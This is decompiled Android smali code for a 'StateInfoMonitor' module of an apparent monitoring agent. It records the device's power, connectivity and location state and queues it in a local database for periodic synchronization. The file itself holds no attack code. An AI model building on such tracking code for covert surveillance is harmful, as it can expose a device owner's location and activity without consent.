.class public Lcom/hp/vd/module/monitor/StateInfoMonitor;
.super Lcom/hp/vd/module/ModuleAbstract;
.source "StateInfoMonitor.java"


# static fields
.field public static final ATTRIBUTE_SYNCHRONIZATION_INTERVAL:Ljava/lang/String; = "state_info_sync_interval"

.field protected static final TAG:Ljava/lang/String; = "StateInfoMonitor"


# instance fields
.field protected buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/BlockingQueue<",
            "Lcom/hp/vd/data/StateInfoData;",
            ">;"
        }
    .end annotation
.end field

.field protected connectivityBroadcastReceiver:Lcom/hp/vd/module/monitor/state/ConnectivityBroadcastReceiver;

.field protected firstRun:Z

.field protected lastSynchronization:Ljava/lang/Long;

.field protected locationBroadcastReceiver:Lcom/hp/vd/module/monitor/state/LocationBroadcastReceiver;

.field protected moduleData:Lcom/hp/vd/data/ModuleData;

.field protected monitoringStatus:Z

.field protected stateInfoDao:Lcom/j256/ormlite/dao/Dao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/j256/ormlite/dao/Dao<",
            "Lcom/hp/vd/data/StateInfoData;",
            "Ljava/lang/Integer;",
            ">;"
        }
    .end annotation
.end field

.field protected writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "Lcom/hp/vd/data/concurrency/QueueConsumerDao<",
            "Lcom/hp/vd/data/StateInfoData;",
            ">;"
        }
    .end annotation
.end field

.field protected writerThread:Ljava/lang/Thread;


# direct methods
.method public constructor <init>()V
    .locals 1

    .line 26
    invoke-direct {p0}, Lcom/hp/vd/module/ModuleAbstract;-><init>()V

    const/4 v0, 0x0

    .line 32
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->monitoringStatus:Z

    const/4 v0, 0x0

    .line 33
    iput-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->stateInfoDao:Lcom/j256/ormlite/dao/Dao;

    .line 35
    iput-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->connectivityBroadcastReceiver:Lcom/hp/vd/module/monitor/state/ConnectivityBroadcastReceiver;

    .line 36
    iput-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->locationBroadcastReceiver:Lcom/hp/vd/module/monitor/state/LocationBroadcastReceiver;

    .line 38
    iput-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    .line 39
    iput-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 40
    iput-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 41
    iput-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->writerThread:Ljava/lang/Thread;

    .line 43
    iput-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x1

    .line 44
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->firstRun:Z

    return-void
.end method


# virtual methods
.method public deinitialize()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public getDataClass()Ljava/lang/Class;
    .locals 1
    .annotation system Ldalvik/annotation/Signature;
        value = {
            "()",
            "Ljava/lang/Class<",
            "*>;"
        }
    .end annotation

    .line 50
    const-class v0, Lcom/hp/vd/data/StateInfoData;

    return-object v0
.end method

.method public getModuleData()Lcom/hp/vd/data/ModuleData;
    .locals 3

    .line 63
    new-instance v0, Lcom/hp/vd/data/ModuleData;

    invoke-direct {v0}, Lcom/hp/vd/data/ModuleData;-><init>()V

    const-string v1, "monitor"

    .line 65
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->type:Ljava/lang/String;

    .line 66
    sget-object v1, Lcom/hp/vd/module/Constants;->STATUS_ACTIVE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->status:Ljava/lang/Integer;

    .line 67
    invoke-virtual {p0}, Ljava/lang/Object;->getClass()Ljava/lang/Class;

    move-result-object v1

    invoke-virtual {v1}, Ljava/lang/Class;->getName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->packageName:Ljava/lang/String;

    .line 68
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/StateInfoMonitor;->getModuleName()Ljava/lang/String;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->name:Ljava/lang/String;

    const/4 v1, 0x1

    .line 69
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->version:Ljava/lang/Integer;

    const-string v1, "v1.0"

    .line 70
    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->versionCodename:Ljava/lang/String;

    const-string v1, "data"

    const-string v2, "text"

    .line 72
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const-string v1, "state_info_sync_interval"

    const-string v2, "3300"

    .line 78
    invoke-virtual {v0, v1, v2}, Lcom/hp/vd/data/ModuleData;->customSet(Ljava/lang/String;Ljava/lang/String;)V

    const/16 v1, 0x1b

    .line 80
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v2

    iput-object v2, v0, Lcom/hp/vd/data/ModuleData;->priorityLoad:Ljava/lang/Integer;

    .line 81
    invoke-static {v1}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v1

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->prioritySynchronization:Ljava/lang/Integer;

    .line 83
    sget-object v1, Lcom/hp/vd/module/Constants;->EXTERNAL_MODULE:Ljava/lang/Integer;

    iput-object v1, v0, Lcom/hp/vd/data/ModuleData;->internal:Ljava/lang/Integer;

    return-object v0
.end method

.method public getModuleName()Ljava/lang/String;
    .locals 1

    const-string v0, "StateInfoMonitor"

    return-object v0
.end method

.method protected hasUpdateIntervalExpired()Z
    .locals 9

    .line 255
    iget-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->lastSynchronization:Ljava/lang/Long;

    .line 256
    invoke-static {}, Ljava/lang/System;->currentTimeMillis()J

    move-result-wide v1

    const-wide/16 v3, 0x3e8

    div-long/2addr v1, v3

    invoke-static {v1, v2}, Ljava/lang/Long;->valueOf(J)Ljava/lang/Long;

    move-result-object v1

    .line 257
    iget-object v2, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;

    const-string v3, "state_info_sync_interval"

    invoke-virtual {v2, v3}, Lcom/hp/vd/data/ModuleData;->customGet(Ljava/lang/String;)Ljava/lang/String;

    move-result-object v2

    invoke-static {v2}, Ljava/lang/Integer;->parseInt(Ljava/lang/String;)I

    move-result v2

    if-eqz v0, :cond_0

    .line 259
    invoke-virtual {v1}, Ljava/lang/Long;->longValue()J

    move-result-wide v3

    invoke-virtual {v0}, Ljava/lang/Long;->longValue()J

    move-result-wide v5

    sub-long v7, v3, v5

    int-to-long v2, v2

    cmp-long v0, v7, v2

    if-gez v0, :cond_0

    const/4 v0, 0x0

    return v0

    .line 263
    :cond_0
    iput-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->lastSynchronization:Ljava/lang/Long;

    const/4 v0, 0x1

    return v0
.end method

.method public initialize()Z
    .locals 4

    .line 91
    iget-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    .line 94
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/StateInfoMonitor;->getDao()Lcom/j256/ormlite/dao/Dao;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->stateInfoDao:Lcom/j256/ormlite/dao/Dao;
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_1

    .line 104
    :try_start_1
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/StateInfoMonitor;->getPersistedModuleData()Lcom/hp/vd/data/ModuleData;

    move-result-object v1

    iput-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->moduleData:Lcom/hp/vd/data/ModuleData;
    :try_end_1
    .catch Ljava/lang/Throwable; {:try_start_1 .. :try_end_1} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    const-string v2, "StateInfoMonitor"

    const-string v3, "initialize(): could not load persisted module data."

    .line 107
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    .line 116
    :goto_0
    new-instance v1, Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1}, Lcom/hp/vd/data/concurrency/BlockingQueue;-><init>()V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    .line 117
    new-instance v1, Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    iget-object v3, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->stateInfoDao:Lcom/j256/ormlite/dao/Dao;

    invoke-direct {v1, v2, v3, v0}, Lcom/hp/vd/data/concurrency/QueueConsumerDao;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/j256/ormlite/dao/Dao;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    .line 119
    new-instance v1, Lcom/hp/vd/module/monitor/state/ConnectivityBroadcastReceiver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1, v2, v0}, Lcom/hp/vd/module/monitor/state/ConnectivityBroadcastReceiver;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->connectivityBroadcastReceiver:Lcom/hp/vd/module/monitor/state/ConnectivityBroadcastReceiver;

    .line 120
    new-instance v1, Lcom/hp/vd/module/monitor/state/LocationBroadcastReceiver;

    iget-object v2, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1, v2, v0}, Lcom/hp/vd/module/monitor/state/LocationBroadcastReceiver;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/agent/log/IWriter;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->locationBroadcastReceiver:Lcom/hp/vd/module/monitor/state/LocationBroadcastReceiver;

    const/4 v0, 0x1

    return v0

    :catch_1
    move-exception v1

    const-string v2, "StateInfoMonitor"

    const-string v3, "Could not create Dao<AccountData>."

    .line 98
    invoke-interface {v0, v2, v3, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    const/4 v0, 0x0

    return v0
.end method

.method public install(Ljava/lang/String;)Z
    .locals 1

    const/16 v0, 0x64

    .line 56
    invoke-static {v0}, Ljava/lang/Integer;->valueOf(I)Ljava/lang/Integer;

    move-result-object v0

    invoke-virtual {p0, v0}, Lcom/hp/vd/module/monitor/StateInfoMonitor;->setDataReadLimit(Ljava/lang/Integer;)Z

    .line 58
    invoke-super {p0, p1}, Lcom/hp/vd/module/ModuleAbstract;->install(Ljava/lang/String;)Z

    move-result p1

    return p1
.end method

.method public isStarted()Z
    .locals 1

    .line 250
    iget-boolean v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->monitoringStatus:Z

    return v0
.end method

.method public start()Z
    .locals 7

    .line 140
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/StateInfoMonitor;->getContext()Lcom/hp/vd/context/Context;

    move-result-object v0

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v0

    const-string v1, "StateInfoMonitor"

    const-string v2, "start() called."

    .line 141
    invoke-interface {v0, v1, v2}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 143
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/StateInfoMonitor;->isActivated()Z

    move-result v1

    const/4 v2, 0x0

    if-nez v1, :cond_0

    const-string v1, "StateInfoMonitor"

    const-string v3, "start(): This module is currently DEactivated."

    .line 144
    invoke-interface {v0, v1, v3}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    return v2

    .line 150
    :cond_0
    :try_start_0
    invoke-virtual {p0}, Lcom/hp/vd/module/monitor/StateInfoMonitor;->hasUpdateIntervalExpired()Z

    move-result v1

    const/4 v3, 0x1

    if-ne v1, v3, :cond_1

    const-string v1, "StateInfoMonitor"

    const-string v4, "start(): interval expired."

    .line 151
    invoke-interface {v0, v1, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 155
    new-instance v1, Lcom/hp/vd/module/monitor/state/PowerExtractor;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->context:Lcom/hp/vd/context/Context;

    iget-object v5, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1, v4, v5, v0}, Lcom/hp/vd/module/monitor/state/PowerExtractor;-><init>(Lcom/hp/vd/context/Context;Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/agent/log/IWriter;)V

    .line 156
    invoke-virtual {v1}, Lcom/hp/vd/module/monitor/state/PowerExtractor;->extract()V

    goto :goto_0

    :cond_1
    const-string v1, "StateInfoMonitor"

    const-string v4, "start(): interval NOT expired."

    .line 159
    invoke-interface {v0, v1, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 169
    :goto_0
    iget-boolean v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->firstRun:Z

    if-ne v1, v3, :cond_2

    const-string v1, "StateInfoMonitor"

    const-string v4, "start(): initial extraction on firstRun"

    .line 170
    invoke-interface {v0, v1, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 172
    new-instance v1, Lcom/hp/vd/module/monitor/state/ConnectivityExtractor;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1, v4, v0}, Lcom/hp/vd/module/monitor/state/ConnectivityExtractor;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/agent/log/IWriter;)V

    .line 173
    iget-object v4, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v1, v4}, Lcom/hp/vd/module/monitor/state/ConnectivityExtractor;->extract(Landroid/content/Context;)V

    .line 175
    new-instance v1, Lcom/hp/vd/module/monitor/state/LocationExtractor;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->buffer:Lcom/hp/vd/data/concurrency/BlockingQueue;

    invoke-direct {v1, v4, v0}, Lcom/hp/vd/module/monitor/state/LocationExtractor;-><init>(Lcom/hp/vd/data/concurrency/BlockingQueue;Lcom/hp/vd/agent/log/IWriter;)V

    .line 176
    iget-object v4, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v4}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v4

    invoke-virtual {v1, v4}, Lcom/hp/vd/module/monitor/state/LocationExtractor;->extract(Landroid/content/Context;)V

    .line 178
    iput-boolean v2, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->firstRun:Z

    .line 185
    :cond_2
    iget-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v1, :cond_3

    iget-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isAlive()Z

    move-result v1

    if-eqz v1, :cond_3

    iget-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->isInterrupted()Z

    move-result v1

    if-eqz v1, :cond_4

    .line 186
    :cond_3
    new-instance v1, Ljava/lang/Thread;

    iget-object v4, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->writer:Lcom/hp/vd/data/concurrency/QueueConsumerDao;

    const-string v5, "Writer-Queue-StateInfo"

    invoke-direct {v1, v4, v5}, Ljava/lang/Thread;-><init>(Ljava/lang/Runnable;Ljava/lang/String;)V

    iput-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->writerThread:Ljava/lang/Thread;

    .line 187
    iget-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v1}, Ljava/lang/Thread;->start()V

    .line 192
    :cond_4
    iget-boolean v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->monitoringStatus:Z

    if-nez v1, :cond_6

    .line 193
    iget-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iget-object v4, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->connectivityBroadcastReceiver:Lcom/hp/vd/module/monitor/state/ConnectivityBroadcastReceiver;

    new-instance v5, Landroid/content/IntentFilter;

    const-string v6, "android.net.conn.CONNECTIVITY_CHANGE"

    invoke-direct {v5, v6}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    const-string v1, "StateInfoMonitor"

    const-string v4, "start(): connectivity receiver registered"

    .line 198
    invoke-interface {v0, v1, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 200
    sget v1, Landroid/os/Build$VERSION;->SDK_INT:I

    const/16 v4, 0x9

    if-lt v1, v4, :cond_5

    .line 202
    iget-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v1

    iget-object v4, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->locationBroadcastReceiver:Lcom/hp/vd/module/monitor/state/LocationBroadcastReceiver;

    new-instance v5, Landroid/content/IntentFilter;

    const-string v6, "android.location.PROVIDERS_CHANGED"

    invoke-direct {v5, v6}, Landroid/content/IntentFilter;-><init>(Ljava/lang/String;)V

    invoke-virtual {v1, v4, v5}, Landroid/content/Context;->registerReceiver(Landroid/content/BroadcastReceiver;Landroid/content/IntentFilter;)Landroid/content/Intent;

    const-string v1, "StateInfoMonitor"

    const-string v4, "start(): location receiver registered"

    .line 207
    invoke-interface {v0, v1, v4}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;)Z

    .line 210
    :cond_5
    iput-boolean v3, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->monitoringStatus:Z
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    :cond_6
    return v3

    :catch_0
    move-exception v1

    const-string v3, "StateInfoMonitor"

    const-string v4, "start(): throwable caught"

    .line 214
    invoke-interface {v0, v3, v4, v1}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    return v2
.end method

.method public startOnHeartbeat()Z
    .locals 1

    const/4 v0, 0x1

    return v0
.end method

.method public stop()Z
    .locals 4

    .line 226
    :try_start_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->writerThread:Ljava/lang/Thread;

    if-eqz v0, :cond_0

    .line 227
    iget-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->writerThread:Ljava/lang/Thread;

    invoke-virtual {v0}, Ljava/lang/Thread;->interrupt()V

    .line 230
    :cond_0
    iget-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->connectivityBroadcastReceiver:Lcom/hp/vd/module/monitor/state/ConnectivityBroadcastReceiver;

    if-eqz v0, :cond_1

    .line 231
    iget-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->connectivityBroadcastReceiver:Lcom/hp/vd/module/monitor/state/ConnectivityBroadcastReceiver;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V

    .line 234
    :cond_1
    iget-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->locationBroadcastReceiver:Lcom/hp/vd/module/monitor/state/LocationBroadcastReceiver;

    if-eqz v0, :cond_2

    .line 235
    iget-object v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v0}, Lcom/hp/vd/context/Context;->getApplicationContext()Landroid/content/Context;

    move-result-object v0

    iget-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->locationBroadcastReceiver:Lcom/hp/vd/module/monitor/state/LocationBroadcastReceiver;

    invoke-virtual {v0, v1}, Landroid/content/Context;->unregisterReceiver(Landroid/content/BroadcastReceiver;)V
    :try_end_0
    .catch Ljava/lang/Throwable; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v0

    .line 239
    iget-object v1, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->context:Lcom/hp/vd/context/Context;

    invoke-virtual {v1}, Lcom/hp/vd/context/Context;->getLog()Lcom/hp/vd/agent/log/IWriter;

    move-result-object v1

    const-string v2, "StateInfoMonitor"

    const-string v3, "Throwable caught in stop()"

    invoke-interface {v1, v2, v3, v0}, Lcom/hp/vd/agent/log/IWriter;->write(Ljava/lang/String;Ljava/lang/String;Ljava/lang/Throwable;)Z

    :cond_2
    :goto_0
    const/4 v0, 0x0

    .line 242
    iput-boolean v0, p0, Lcom/hp/vd/module/monitor/StateInfoMonitor;->monitoringStatus:Z

    const/4 v0, 0x1

    return v0
.end method
